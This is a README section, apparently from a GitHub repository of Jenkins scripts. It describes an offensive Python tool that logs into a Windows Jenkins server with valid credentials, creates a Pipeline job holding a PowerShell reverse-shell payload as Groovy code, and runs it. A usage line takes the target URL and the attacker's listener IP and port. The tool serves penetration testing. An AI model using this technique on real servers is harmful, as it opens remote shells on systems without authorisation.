## win_revshell_groovy.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Windows.\
And Jenkins must have the "[workflow-cps](https://plugins.jenkins.io/workflow-cps/)" or "Pipeline: Groovy" plugin installed.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new **"Pipeline"** JOB.

![win_revshell_groovy_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_1.png)

Then configures it or BUILD a **"Pipeline script"** with the **Powershell** payload as **Groovy** code.
![win_revshell_groovy_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./win_revshell_groovy.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![win_revshell_groovy_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_3.png)
![win_revshell_groovy_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_4.png)

Tested on Jenkins 2.150.2 and Windows 10 Pro 22H2 b.19045
